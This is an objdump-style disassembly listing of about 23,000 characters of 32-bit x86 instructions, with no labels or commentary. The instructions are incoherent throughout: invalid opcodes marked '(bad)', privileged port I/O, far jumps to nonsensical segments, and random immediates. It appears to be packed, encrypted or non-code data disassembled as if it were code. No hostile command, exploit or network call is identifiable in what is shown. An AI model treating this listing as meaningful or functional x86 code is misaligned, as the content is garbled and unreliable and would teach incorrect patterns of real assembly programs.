  4037ed:	mov    ebp,0x7c064830
  4037f2:	and    BYTE PTR [edx+0x3fa06665],dh
  4037f8:	or     al,0xed
  4037fa:	ins    DWORD PTR es:[edi],dx
  4037fb:	dec    ebp
  4037fc:	ror    BYTE PTR [edx],1
  4037fe:	adc    al,0xe7
  403800:	inc    edi
  403801:	add    al,dh
  403803:	lods   eax,DWORD PTR ds:[esi]
  403804:	scas   eax,DWORD PTR es:[edi]
  403805:	sub    ebp,DWORD PTR [ebx-0x221f7816]
  40380b:	or     BYTE PTR [ebp-0xf],bl
  40380e:	inc    edx
  40380f:	sbb    edx,DWORD PTR [ecx+0x4]
  403812:	jmp    0x5a84aaa9
  403817:	pop    esi
  403818:	mov    esi,0xa09b6450
  40381d:	out    dx,al
  40381e:	fwait
  40381f:	loop   0x4037b7
  403821:	popa   
  403822:	pop    ebp
  403823:	push   esi
  403824:	pop    ss
  403825:	(bad)  
  403826:	and    BYTE PTR [ebp+0x56453ef5],0x88
  40382d:	xchg   edx,eax
  40382e:	pop    ecx
  40382f:	add    BYTE PTR [ebp+0x6e3d9ae3],dl
  403835:	pop    ebp
  403836:	rol    DWORD PTR [esp+ebx*1-0x78],0x28
  40383b:	sti    
  40383c:	or     al,0xbf
  40383e:	mov    ecx,0xebab2ad4
  403843:	xchg   ecx,eax
  403844:	sbb    al,0x1e
  403846:	mov    ds:0x167ba66d,al
  40384b:	fidiv  WORD PTR [ebx-0x34b21bd0]
  403851:	stc    
  403852:	push   es
  403853:	lock enter 0xfb83,0x29
  403858:	shl    DWORD PTR [edx+edx*4],cl
  40385b:	mov    esp,0x5833eed
  403860:	fld    TBYTE PTR [ecx-0x3b]
  403863:	loop   0x403863
  403865:	cmc    
  403866:	sbb    al,0xa5
  403868:	inc    ebp
  403869:	mov    ss,WORD PTR [ecx-0x4a]
  40386c:	sti    
  40386d:	sbb    esi,eax
  40386f:	cld    
  403870:	fucom  st(1)
  403872:	or     bl,bl
  403874:	adc    eax,0xe6a94c9d
  403879:	xor    ch,BYTE PTR [edi]
  40387b:	push   esp
  40387c:	or     eax,0xacb35156
  403881:	imul   eax,DWORD PTR [edx],0xffffffb3
  403884:	mov    bl,0xc2
  403886:	jbe    0x403817
  403888:	out    dx,eax
  403889:	test   BYTE PTR es:0x1cac9fbd,al
  403890:	int3   
  403891:	stos   DWORD PTR es:[edi],eax
  403892:	(bad)  
  403894:	jne    0x403833
  403896:	and    BYTE PTR [edx],0x7c
  403899:	or     eax,DWORD PTR [ebx]
  40389b:	mov    eax,ds:0xfe3eed4b
  4038a0:	stos   DWORD PTR es:[edi],eax
  4038a1:	and    al,0x55
  4038a3:	adc    ebx,DWORD PTR [ecx]
  4038a5:	pop    eax
  4038a6:	mov    ecx,0xdb354
  4038ab:	sahf   
  4038ac:	xchg   DWORD PTR [eax-0x36f7eed4],edi
  4038b2:	clc    
  4038b3:	ss dec edx
  4038b5:	loop   0x403866
  4038b7:	xchg   edi,eax
  4038b8:	rcr    BYTE PTR [edx+0x19],0xc3
  4038bc:	out    dx,al
  4038bd:	push   edi
  4038be:	test   DWORD PTR [edi+0x14c93107],esp
  4038c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038c5:	repz xor esp,DWORD PTR [eax]
  4038c8:	fstp   TBYTE PTR ds:0x8b6e9105
  4038ce:	inc    ecx
  4038cf:	sub    al,0x37
  4038d1:	xchg   esi,eax
  4038d2:	pop    esi
  4038d3:	in     eax,dx
  4038d4:	xor    dh,0xa0
  4038d7:	inc    ebx
  4038d8:	arpl   cx,di
  4038da:	xchg   ebx,eax
  4038db:	xor    DWORD PTR [ebx-0x5d3fca71],ebx
  4038e1:	mov    ebp,0xf93e75f2
  4038e6:	sub    ecx,DWORD PTR [eax+0x73]
  4038e9:	sbb    DWORD PTR [eax+ecx*4+0x4f191044],edi
  4038f0:	ror    DWORD PTR [edi-0x4f],cl
  4038f3:	je     0x4038b1
  4038f5:	inc    ebp
  4038f6:	mov    edi,0x56e0617a
  4038fb:	pop    ecx
  4038fc:	inc    ebx
  4038fd:	dec    eax
  4038fe:	cld    
  4038ff:	inc    esi
  403900:	pop    edi
  403901:	jno    0x403886
  403903:	push   0x3c
  403905:	aam    0x9c
  403907:	mov    bh,0x4b
  403909:	iret   
  40390a:	out    dx,eax
  40390b:	mov    DWORD PTR [edx-0x36],edx
  40390e:	jmp    0xb6d3561
  403913:	pop    ecx
  403914:	xchg   DWORD PTR [ecx],esi
  403916:	int3   
  403917:	iret   
  403918:	stos   BYTE PTR es:[edi],al
  403919:	push   0xffffffe2
  40391b:	bound  edi,QWORD PTR [ecx+0x3b]
  40391e:	ret    
  40391f:	jo     0x4038e5
  403921:	mov    DWORD PTR [esi+0x23],esp
  403924:	add    al,0x2f
  403926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403927:	ret    
  403928:	push   eax
  403929:	sti    
  40392a:	bound  esi,QWORD PTR [ecx+ebx*2+0x773470aa]
  403931:	mov    al,0xcd
  403933:	sbb    edi,eax
  403935:	or     al,0x81
  403937:	pop    ds
  403938:	mov    DWORD PTR [ebx+0x46],edi
  40393b:	mov    ebp,DWORD PTR [edx-0x7e]
  40393e:	pushf  
  40393f:	shl    DWORD PTR [edx-0x79f7666d],1
  403945:	xchg   ebx,eax
  403946:	fs (bad) 
  403948:	ror    BYTE PTR [ebx-0x655e7eda],1
  40394e:	out    0xe7,eax
  403950:	jecxz  0x403987
  403952:	loope  0x403990
  403954:	mov    al,0x8e
  403956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403957:	enter  0xd469,0x12
  40395b:	xchg   edi,eax
  40395c:	inc    ebp
  40395d:	push   edi
  40395e:	or     al,0xb2
  403960:	loope  0x40391f
  403962:	inc    esi
  403963:	jp     0x40392d
  403965:	jge    0x403919
  403967:	jp     0x4039a0
  403969:	out    dx,eax
  40396a:	adc    ebp,ebx
  40396c:	leave  
  40396d:	adc    BYTE PTR [ebx-0xd2f041e],dh
  403973:	repnz (bad) 
  403975:	repz pop ss
  403977:	test   BYTE PTR [ebx+0x24],al
  40397a:	dec    DWORD PTR [ecx+0x675b9672]
  403980:	sar    edi,cl
  403982:	repz sbb dl,BYTE PTR [ebx+0x19]
  403986:	adc    eax,0x12499bd8
  40398b:	jno    0x403917
  40398d:	ins    BYTE PTR es:[edi],dx
  40398e:	leave  
  40398f:	lods   al,BYTE PTR ds:[esi]
  403990:	sub    BYTE PTR [ecx],bl
  403992:	cmp    eax,0xba9ec608
  403997:	imul   ebp,DWORD PTR [esi-0x9],0xf172319
  40399e:	push   edi
  40399f:	xor    DWORD PTR [eax+0x31d5065e],esp
  4039a5:	outs   dx,DWORD PTR ds:[esi]
  4039a6:	add    DWORD PTR [eax+eax*2+0x7dc90a30],edi
  4039ad:	mov    eax,0x739ca88e
  4039b2:	int    0xca
  4039b4:	mov    esp,edx
  4039b6:	mov    dl,0x12
  4039b8:	mov    edi,esi
  4039ba:	or     ah,BYTE PTR [eax-0x23]
  4039bd:	inc    edi
  4039be:	mov    BYTE PTR [eax],al
  4039c0:	mov    dl,0x33
  4039c2:	sbb    al,0xc8
  4039c4:	fidivr WORD PTR [eax]
  4039c6:	push   0x42
  4039c8:	mov    cl,0x4e
  4039ca:	mov    ebp,0x2889c4a6
  4039cf:	pop    es
  4039d0:	or     ah,bl
  4039d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d3:	xchg   ebp,eax
  4039d4:	push   esi
  4039d5:	sub    ecx,DWORD PTR [ecx+0x6d]
  4039d8:	rcr    esp,cl
  4039da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039db:	or     eax,0xc9105d1
  4039e0:	pop    ebp
  4039e1:	(bad)  
  4039e3:	leave  
  4039e4:	rol    ebp,cl
  4039e6:	push   esp
  4039e7:	mov    cl,0x50
  4039e9:	js     0x40399e
  4039eb:	xchg   esi,ebp
  4039ed:	mov    ebx,0x513b9c7c
  4039f2:	int    0xd8
  4039f4:	jmp    0x403a27
  4039f6:	and    DWORD PTR [edx+0x4d],esi
  4039f9:	mov    esp,0xfee6da73
  4039fe:	jmpw   0xa67
  403a02:	mov    eax,ds:0x4eb8012c
  403a07:	mov    edi,0x523d6a6e
  403a0c:	out    0x8b,eax
  403a0e:	or     eax,0xcc4cd734
  403a13:	jno    0x403a5d
  403a15:	aas    
  403a16:	jns    0x4039ef
  403a18:	lods   al,BYTE PTR ds:[esi]
  403a19:	dec    eax
  403a1a:	and    eax,0xf1cd434
  403a1f:	mov    bl,0x2d
  403a21:	mov    es,WORD PTR [edi]
  403a23:	pushf  
  403a24:	sub    edx,esi
  403a26:	push   ebx
  403a27:	xor    eax,DWORD PTR [edi]
  403a29:	push   ecx
  403a2a:	addr16 pop eax
  403a2c:	fidivr DWORD PTR [ecx+ecx*2-0x52]
  403a30:	xor    al,0x1
  403a32:	not    DWORD PTR [ebx*1+0x169ee7f8]
  403a39:	clc    
  403a3a:	test   eax,0xba9b8b2b
  403a3f:	mov    bh,0xa1
  403a41:	add    BYTE PTR [ebp+ecx*1+0x2ec2600b],0x75
  403a49:	popf   
  403a4a:	push   eax
  403a4b:	int    0x8a
  403a4d:	dec    ecx
  403a4e:	pop    esi
  403a4f:	fs stos DWORD PTR es:[edi],eax
  403a51:	into   
  403a52:	mov    ebx,0x5f678838
  403a57:	mov    ecx,0x56f0c4c2
  403a5c:	mov    eax,ds:0x5aca79b7
  403a61:	test   DWORD PTR [esi],esi
  403a63:	mov    WORD PTR [eax+0x1b],ss
  403a66:	test   bh,ch
  403a68:	add    DWORD PTR [ebx],ebx
  403a6a:	jp     0x403a89
  403a6c:	mov    al,ds:0x27710383
  403a71:	enter  0x7fef,0xe2
  403a75:	pop    ecx
  403a76:	cmp    ebx,eax
  403a78:	sub    al,0x38
  403a7a:	mov    esp,0x1cc1f44a
  403a7f:	sub    BYTE PTR [ebx+0x10],bh
  403a82:	push   edi
  403a83:	repnz loop 0x403adf
  403a86:	fsubr  QWORD PTR [eax+ecx*4+0x11da0622]
  403a8d:	xor    DWORD PTR [edi+0x4ad20d14],edi
  403a93:	inc    edi
  403a94:	adc    eax,0x7c1d776
  403a99:	push   ds
  403a9a:	in     eax,dx
  403a9b:	neg    BYTE PTR [edi]
  403a9d:	jbe    0x403ac6
  403a9f:	push   cs
  403aa0:	retf   
  403aa1:	repz pop esp
  403aa3:	cmc    
  403aa4:	pushf  
  403aa5:	sbb    edx,DWORD PTR [edx-0x59]
  403aa8:	push   es
  403aa9:	add    esp,DWORD PTR [esi-0x63]
  403aac:	into   
  403aad:	jmp    0x403b10
  403aaf:	ds cs call 0x4cbb:0xbf090572
  403ab8:	je     0x403a85
  403aba:	in     al,0x38
  403abc:	xchg   ebp,eax
  403abd:	jg     0x403aa0
  403abf:	adc    al,0x8
  403ac1:	cmp    al,0x4e
  403ac3:	ret    0xe17
  403ac6:	or     BYTE PTR [edx+ebx*4+0x74],0x3b
  403acb:	lea    ebp,[ebx-0x70]
  403ace:	lds    esp,FWORD PTR [edi]
  403ad0:	ss (bad) 
  403ad2:	sub    al,0x8e
  403ad4:	inc    ebx
  403ad5:	sbb    BYTE PTR [edi+esi*4-0x5f66cb3d],al
  403adc:	ds mov ah,0xdd
  403adf:	cwde   
  403ae0:	sub    dl,0xc9
  403ae3:	ss ins DWORD PTR es:[edi],dx
  403ae5:	jl     0x403b26
  403ae7:	add    edi,DWORD PTR [ecx-0x3eceaeac]
  403aed:	(bad)  
  403aee:	ret    0x613e
  403af1:	mov    dh,0xaf
  403af3:	jb     0x403abb
  403af5:	dec    esi
  403af6:	out    dx,eax
  403af7:	dec    esi
  403af8:	inc    esi
  403af9:	mov    ah,0x5d
  403afb:	ja     0x403b09
  403afd:	test   BYTE PTR [ebx-0x14ab3844],ch
  403b03:	inc    ebx
  403b04:	stc    
  403b05:	add    al,0xf3
  403b07:	and    eax,0x74ff01d7
  403b0c:	mov    edi,0x409a56
  403b11:	and    al,0x19
  403b13:	xchg   edi,eax
  403b14:	jl     0x403b7d
  403b16:	or     esi,DWORD PTR [ecx-0x4908919a]
  403b1c:	inc    ecx
  403b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b1e:	jmp    0x4ac9e8f
  403b23:	xchg   edi,eax
  403b24:	retf   0x9e05
  403b27:	push   ds
  403b28:	push   edi
  403b29:	pop    ss
  403b2a:	pop    edx
  403b2b:	push   edx
  403b2c:	fcmovnb st,st(3)
  403b2e:	xchg   esp,eax
  403b2f:	sar    ecx,cl
  403b31:	(bad)  
  403b32:	in     al,0x1a
  403b34:	jecxz  0x403b11
  403b36:	pop    ebp
  403b37:	icebp  
  403b38:	mov    edx,0x98057c58
  403b3d:	ss repnz lahf 
  403b40:	dec    ecx
  403b41:	push   ecx
  403b42:	adc    ebp,0x10
  403b45:	sbb    eax,0x3040879f
  403b4a:	dec    esp
  403b4b:	ja     0x403ba9
  403b4d:	cwde   
  403b4e:	imul   esp,ecx,0x0
  403b51:	aas    
  403b52:	pop    ebp
  403b53:	push   esi
  403b54:	adc    esi,DWORD PTR [edi-0x20116dc0]
  403b5a:	mov    esp,DWORD PTR [edx]
  403b5c:	xchg   edx,eax
  403b5d:	int3   
  403b5e:	xchg   edx,eax
  403b5f:	(bad)  
  403b60:	jae    0x403b7a
  403b62:	pusha  
  403b63:	stos   DWORD PTR es:[edi],eax
  403b64:	in     al,0x78
  403b66:	int    0x9e
  403b68:	push   ds
  403b69:	adc    DWORD PTR [ebp-0x2480bbe8],0x66
  403b70:	push   edx
  403b71:	popa   
  403b72:	ss shl cl,cl
  403b75:	shl    BYTE PTR [eax],cl
  403b77:	ficom  WORD PTR [ecx]
  403b79:	jo     0x403b7d
  403b7b:	jmp    0xc2ea:0xc35464c4
  403b82:	jbe    0x403bfd
  403b84:	adc    DWORD PTR [esi-0x2954c7ca],ebp
  403b8a:	or     ebx,DWORD PTR [edi]
  403b8c:	out    0x94,eax
  403b8e:	stc    
  403b8f:	call   DWORD PTR [ecx-0x32]
  403b92:	fs (bad) 
  403b94:	ja     0x403b1e
  403b96:	out    dx,eax
  403b97:	jle    0x403bd6
  403b99:	lahf   
  403b9a:	push   ebx
  403b9b:	push   eax
  403b9c:	jecxz  0x403ba9
  403b9e:	outs   dx,BYTE PTR ds:[esi]
  403b9f:	clc    
  403ba0:	mov    ds:0xd0cfc60b,al
  403ba5:	mov    eax,cs
  403ba7:	outs   dx,DWORD PTR ds:[esi]
  403ba8:	push   esp
  403ba9:	ja     0x403c1c
  403bab:	outs   dx,BYTE PTR ds:[esi]
  403bac:	add    dh,BYTE PTR [eax+edx*1-0x4ed14b70]
  403bb3:	jmp    0xcbe:0x80c43082
  403bba:	and    dh,cl
  403bbc:	test   DWORD PTR [edx],ebp
  403bbe:	inc    ebp
  403bbf:	xor    bh,BYTE PTR [edi]
  403bc1:	daa    
  403bc2:	add    esi,DWORD PTR [eax]
  403bc4:	clc    
  403bc5:	les    ecx,FWORD PTR [edi]
  403bc7:	mov    al,0x1b
  403bc9:	or     dh,BYTE PTR [ebx+0x44]
  403bcc:	mov    edx,0x277011dd
  403bd1:	mov    ebx,0x27823f19
  403bd6:	adc    eax,0x41afa31f
  403bdb:	out    dx,al
  403bdc:	aad    0x49
  403bde:	popf   
  403bdf:	sbb    al,0xf4
  403be1:	call   0x3227:0x29bb5229
  403be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403be9:	test   DWORD PTR [ebp+0x2d],eax
  403bec:	pop    esi
  403bed:	in     eax,dx
  403bee:	test   eax,0x2dc10a0d
  403bf3:	enter  0xd6bc,0x11
  403bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bf8:	jl     0x403c2e
  403bfa:	xchg   edx,eax
  403bfb:	jmp    0x403bc7
  403bfd:	lods   al,BYTE PTR ds:[esi]
  403bfe:	outs   dx,DWORD PTR ds:[esi]
  403bff:	pop    es
  403c00:	mov    ecx,0x8f6fcf6f
  403c05:	xchg   esp,eax
  403c06:	inc    eax
  403c07:	das    
  403c08:	cmp    esi,edi
  403c0a:	or     edi,DWORD PTR [ebx+ebx*2]
  403c0d:	mov    edx,0x6e47093f
  403c12:	retf   0x1d51
  403c15:	pop    edx
  403c16:	loope  0x403c25
  403c18:	into   
  403c19:	push   0x1d
  403c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c1c:	dec    ecx
  403c1d:	dec    esi
  403c1e:	mov    ch,0x43
  403c20:	(bad)
  403c23:	icebp  
  403c24:	rcl    BYTE PTR [ebx+0x2d939f09],1
  403c2a:	(bad)  
  403c2b:	or     al,BYTE PTR [esi]
  403c2d:	pop    es
  403c2e:	pop    ebx
  403c2f:	sub    al,0xe1
  403c31:	adc    ebx,DWORD PTR [edx+0x35028305]
  403c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c38:	xor    al,0xbc
  403c3a:	call   DWORD PTR [edi-0x1675a4ec]
  403c40:	aad    0xaa
  403c42:	clc    
  403c43:	std    
  403c44:	push   es
  403c45:	mov    ds:0x1e17b52b,al
  403c4a:	retf   
  403c4b:	or     al,0x1f
  403c4d:	imul   esi,DWORD PTR [edx+0x4d],0xffffffbc
  403c51:	std    
  403c52:	adc    al,0x8e
  403c54:	stc    
  403c55:	mov    esp,0x5a17e9a2
  403c5a:	xchg   edx,eax
  403c5b:	inc    edx
  403c5c:	rol    DWORD PTR [edx+eiz*1+0xc],0xf8
  403c61:	jl     0x403cc9
  403c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c64:	jns    0x403c69
  403c66:	push   ds
  403c67:	(bad)  
  403c68:	shr    DWORD PTR [ecx+edx*4],cl
  403c6b:	push   edi
  403c6c:	cld    
  403c6d:	popf   
  403c6e:	inc    ecx
  403c6f:	stos   DWORD PTR es:[edi],eax
  403c70:	xor    edi,DWORD PTR [edx+0x19]
  403c73:	sub    BYTE PTR [eax+0x12c5ce0f],cl
  403c79:	and    BYTE PTR [ecx-0x1994788f],cl
  403c7f:	adc    dh,BYTE PTR [esi+ebx*1+0x6d]
  403c83:	or     esi,edi
  403c85:	jmp    edi
  403c87:	dec    esi
  403c88:	dec    esi
  403c89:	stos   BYTE PTR es:[edi],al
  403c8a:	test   BYTE PTR [ecx-0xc],bh
  403c8d:	xchg   esp,edx
  403c8f:	(bad)  
  403c90:	sbb    BYTE PTR [ecx+0x27],dl
  403c93:	mov    esi,DWORD PTR [edi+ebx*4-0x36]
  403c97:	js     0x403cdd
  403c99:	aam    0xd5
  403c9b:	mov    eax,ds:0xea57c989
  403ca0:	data16 in al,0xfe
  403ca3:	aam    0xeb
  403ca5:	xchg   ebx,eax
  403ca6:	xlat   BYTE PTR ds:[ebx]
  403ca7:	and    BYTE PTR [esi-0x1580e90c],bh
  403cad:	mov    ds:0x819943fa,al
  403cb2:	scas   al,BYTE PTR es:[edi]
  403cb3:	js     0x403c9d
  403cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cb6:	mov    ecx,0x9b710261
  403cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cbc:	sub    eax,DWORD PTR [ebx+0x46]
  403cbf:	sub    eax,0x6bb0eb72
  403cc5:	lods   eax,DWORD PTR ds:[si]
  403cc7:	adc    dl,BYTE PTR ss:[esi-0x75]
  403ccb:	dec    esi
  403ccc:	inc    ebp
  403ccd:	sub    edi,esp
  403ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cd0:	dec    ecx
  403cd1:	int    0x12
  403cd3:	es in  eax,0x3b
  403cd6:	pop    ebp
  403cd7:	loop   0x403c6e
  403cd9:	cmp    dl,dl
  403cdb:	mov    ebx,0xfe77b0c7
  403ce0:	mov    ah,0x62
  403ce2:	fs inc edi
  403ce4:	dec    eax
  403ce5:	cmc    
  403ce6:	repz daa 
  403ce8:	in     eax,0xb5
  403cea:	enter  0xa762,0x66
  403cee:	leave  
  403cef:	sbb    eax,eax
  403cf1:	inc    esi
  403cf2:	sbb    DWORD PTR [eax+ebp*2+0x54],eax
  403cf6:	pop    eax
  403cf7:	jbe    0x403d69
  403cf9:	sub    ebp,DWORD PTR [esi]
  403cfb:	js     0x403d6d
  403cfd:	pop    ss
  403cfe:	or     al,BYTE PTR [edx]
  403d00:	mov    eax,ds:0x325bca74
  403d05:	push   ss
  403d06:	popf   
  403d07:	xchg   ebp,eax
  403d08:	std    
  403d09:	stos   BYTE PTR es:[edi],al
  403d0a:	cmp    al,0xd5
  403d0c:	jge    0x403cf9
  403d0e:	inc    eax
  403d0f:	out    0xcf,eax
  403d11:	pop    eax
  403d12:	xchg   BYTE PTR [edi+0x18],bh
  403d15:	fimul  WORD PTR [edi]
  403d17:	sub    ebx,DWORD PTR [edi]
  403d19:	jmp    FWORD PTR [ecx]
  403d1b:	jns    0x403d96
  403d1d:	xor    BYTE PTR [esi],dl
  403d1f:	add    al,0xce
  403d21:	push   esp
  403d22:	pop    edi
  403d23:	dec    esp
  403d24:	xor    esi,eax
  403d26:	rol    edx,1
  403d28:	mov    esp,0x8454f577
  403d2d:	out    dx,eax
  403d2e:	and    al,BYTE PTR [eax]
  403d30:	pop    es
  403d31:	jge    0x403cf9
  403d33:	dec    edi
  403d34:	arpl   WORD PTR [edi+0x44cbb7a7],si
  403d3a:	in     eax,0x6d
  403d3c:	lea    edx,[edx+0x2f]
  403d3f:	cmp    bl,bh
  403d41:	xchg   ebx,eax
  403d42:	inc    ebx
  403d43:	out    0x51,eax
  403d45:	xchg   ebp,eax
  403d46:	jp     0x403dbc
  403d48:	out    0x63,al
  403d4a:	sub    eax,0x377bebc9
  403d4f:	mov    ah,0x20
  403d51:	mov    bh,0x16
  403d53:	pop    edi
  403d54:	pop    ebx
  403d55:	pop    ebx
  403d56:	ins    DWORD PTR es:[edi],dx
  403d57:	cli    
  403d58:	mov    dh,0x12
  403d5a:	jl     0x403dd5
  403d5c:	cmovo  ebp,DWORD PTR [edi]
  403d5f:	mov    ds:0xe33de855,eax
  403d64:	in     eax,dx
  403d65:	je     0x403d83
  403d67:	adc    eax,0x9b974dcd
  403d6c:	inc    esi
  403d6d:	sbb    DWORD PTR ds:0x9451772d,0xf88cfa39
  403d77:	or     eax,0x9ebb975b
  403d7c:	div    DWORD PTR [edx+0x49]
  403d7f:	mov    ah,0x65
  403d81:	retw   
  403d83:	sub    bh,BYTE PTR [edi-0x4e447bcf]
  403d89:	sbb    ah,0x88
  403d8c:	inc    edi
  403d8d:	pop    ecx
  403d8e:	ret    0xaa00
  403d91:	or     eax,0x1b2721f1
  403d96:	pusha  
  403d97:	aaa    
  403d98:	outs   dx,BYTE PTR ds:[esi]
  403d99:	enter  0x72f,0xc5
  403d9d:	ret    
  403d9e:	dec    eax
  403d9f:	fisub  WORD PTR [ebx+0x5f4fa9cd]
  403da5:	mov    ds:0x37268423,al
  403daa:	adc    al,0xe
  403dac:	mov    ebp,0xd03bd227
  403db1:	bound  ebx,QWORD PTR [edi-0x21]
  403db4:	cmp    ch,BYTE PTR [edx+0x6633c2ed]
  403dba:	inc    ebp
  403dbb:	xchg   esi,eax
  403dbc:	fs inc edx
  403dbe:	ins    DWORD PTR es:[edi],dx
  403dbf:	mov    ds:0xba160944,eax
  403dc4:	add    eax,0xb24a276
  403dc9:	jae    0x403da6
  403dcb:	xlat   BYTE PTR ds:[ebx]
  403dcc:	imul   ecx,DWORD PTR [ebx],0xbf2b5384
  403dd2:	jmp    0xe87:0xdb19eff0
  403dd9:	mov    ebx,0x713296d3
  403dde:	call   0xb7c3:0xb515389a
  403de5:	clc    
  403de6:	cli    
  403de7:	jge    0x403df8
  403de9:	sub    esp,ebp
  403deb:	pop    ebx
  403dec:	mov    BYTE PTR [edi+0x4e],dh
  403def:	xor    ah,ah
  403df1:	mov    edx,esi
  403df3:	xchg   edi,eax
  403df4:	stos   DWORD PTR es:[edi],eax
  403df5:	add    al,0xbf
  403df7:	test   eax,0xbd6be58f
  403dfc:	sub    bl,bl
  403dfe:	mov    esp,0x6e36b94c
  403e03:	or     esp,esp
  403e05:	mov    edx,0x3bc346c5
  403e0a:	mov    al,0xa6
  403e0c:	xor    esi,esi
  403e0e:	ss mov ebp,0x2c863eda
  403e14:	adc    al,ch
  403e16:	hlt    
  403e17:	mov    dl,0x6c
  403e19:	mov    ds:0x5657cfeb,al
  403e1e:	into   
  403e1f:	test   DWORD PTR [eax],ebx
  403e21:	scas   al,BYTE PTR es:[edi]
  403e22:	mov    esi,0xe9cfd64b
  403e27:	iret   
  403e28:	mov    es,WORD PTR [edi+edx*8-0x56a511cd]
  403e2f:	hlt    
  403e30:	pop    fs
  403e32:	pop    ebx
  403e33:	or     eax,0x1836f5d5
  403e38:	sti    
  403e39:	ret    
  403e3a:	jp     0x403e15
  403e3c:	adc    ch,BYTE PTR [edi+0x1f789263]
  403e42:	mov    ebp,0x85652f1e
  403e47:	push   ecx
  403e48:	out    0xe3,eax
  403e4a:	bound  ecx,QWORD PTR [eax+0x5821a54f]
  403e50:	stc    
  403e51:	loop   0x403e6f
  403e53:	cwde   
  403e54:	scas   al,BYTE PTR es:[edi]
  403e55:	xor    DWORD PTR [eax+0x7cbef3e],edx
  403e5b:	cmp    eax,0x4711a7bb
  403e60:	push   ss
  403e61:	and    al,0x3d
  403e63:	xchg   edx,eax
  403e64:	dec    ecx
  403e65:	mov    cl,0x66
  403e67:	rol    DWORD PTR ds:0x2c4e3cf5,1
  403e6d:	(bad)  
  403e6e:	push   edx
  403e6f:	loopne 0x403e2c
  403e71:	mov    cl,0x10
  403e73:	xor    BYTE PTR [edx+0x3a3becec],0x73
  403e7a:	jecxz  0x403e62
  403e7c:	sbb    BYTE PTR [esi-0x48],0x0
  403e80:	out    0x68,eax
  403e82:	jnp    0x403ec3
  403e84:	fiadd  DWORD PTR [eax+ebp*2]
  403e87:	inc    eax
  403e88:	lock xor esi,edi
  403e8b:	sub    al,0xb4
  403e8d:	popa   
  403e8e:	xor    esp,esi
  403e90:	rol    BYTE PTR [eax-0x62],0x65
  403e94:	sbb    esi,0xdf43f1ab
  403e9a:	pop    edi
  403e9b:	stos   BYTE PTR es:[edi],al
  403e9c:	cdq    
  403e9d:	xchg   ebx,eax
  403e9e:	or     BYTE PTR [ebp-0x5c80b1d3],dl
  403ea4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ea6:	cmc    
  403ea7:	mov    ch,0x54
  403ea9:	fnsave [ebp-0x71]
  403eac:	jmp    0x75b69f3e
  403eb1:	jmp    0xf6b0:0x220eb3a0
  403eb8:	arpl   WORD PTR [esp+esi*8-0x27399366],bx
  403ebf:	or     ecx,esi
  403ec1:	cdq    
  403ec2:	icebp  
  403ec3:	mov    bl,0xbd
  403ec5:	sbb    bl,BYTE PTR [esi+0x6]
  403ec8:	ds add eax,0xe802c294
  403ece:	stc    
  403ecf:	in     al,dx
  403ed0:	rcl    DWORD PTR [eax-0x65],1
  403ed3:	xchg   edx,eax
  403ed4:	cmp    DWORD PTR [edx],ebx
  403ed6:	push   ecx
  403ed7:	push   0xe9b9502f
  403edc:	dec    edi
  403edd:	jl     0x403f01
  403edf:	loope  0x403eab
  403ee1:	pushf  
  403ee2:	pop    ecx
  403ee3:	push   ecx
  403ee4:	jo     0x403eb6
  403ee6:	sbb    al,0x4d
  403ee8:	(bad)  
  403ee9:	enter  0x846c,0x58
  403eed:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eef:	dec    eax
  403ef0:	dec    ecx
  403ef1:	ret    
  403ef2:	jmp    0x403ef1
  403ef4:	dec    eax
  403ef5:	xlat   BYTE PTR ds:[ebx]
  403ef6:	retfw  0x1113
  403efa:	jle    0x403f0c
  403efc:	inc    ecx
  403efd:	push   esp
  403efe:	inc    eax
  403eff:	mov    edi,0xebd55c20
  403f04:	jg     0x403e89
  403f06:	push   edi
  403f07:	dec    ebp
  403f08:	push   ds
  403f09:	inc    esp
  403f0a:	hlt    
  403f0b:	pop    eax
  403f0c:	or     al,0xbf
  403f0e:	mov    ah,BYTE PTR [ebx+0x69a8b3e9]
  403f14:	mov    bl,0x82
  403f16:	push   ebx
  403f17:	pop    esp
  403f18:	ins    BYTE PTR es:[edi],dx
  403f19:	jns    0x403ec6
  403f1b:	mov    BYTE PTR [esi+esi*4-0x1fb97fb9],bh
  403f22:	mov    ebp,0xf8564720
  403f27:	push   0xffffff82
  403f29:	xchg   BYTE PTR [ecx-0x6c50425d],al
  403f2f:	mov    dl,0x46
  403f31:	xchg   edx,eax
  403f32:	mov    ecx,0x9bcf1fb8
  403f37:	sar    BYTE PTR [eax],0x93
  403f3a:	adc    al,0xcd
  403f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f3d:	dec    ecx
  403f3e:	mov    ds:0xc7659862,al
  403f43:	mov    DWORD PTR [edi],esp
  403f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f46:	mov    edi,0x67eee01e
  403f4b:	xor    edx,DWORD PTR [eax-0x14]
  403f4e:	mov    esi,0x6921ed09
  403f53:	sbb    ah,ch
  403f55:	and    ah,BYTE PTR [ecx+0x32]
  403f58:	xlat   BYTE PTR ds:[ebx]
  403f59:	mov    eax,ds:0x26b843ae
  403f5e:	dec    eax
  403f5f:	or     al,0x44
  403f61:	test   DWORD PTR [ebp+0x1f29c7a7],0x5153b4db
  403f6b:	sti    
  403f6c:	jge    0x403f18
  403f6e:	add    eax,0x620f491d
  403f73:	dec    eax
  403f74:	test   BYTE PTR [edi],0xea
  403f77:	clc    
  403f78:	mov    dl,0x42
  403f7a:	push   edi
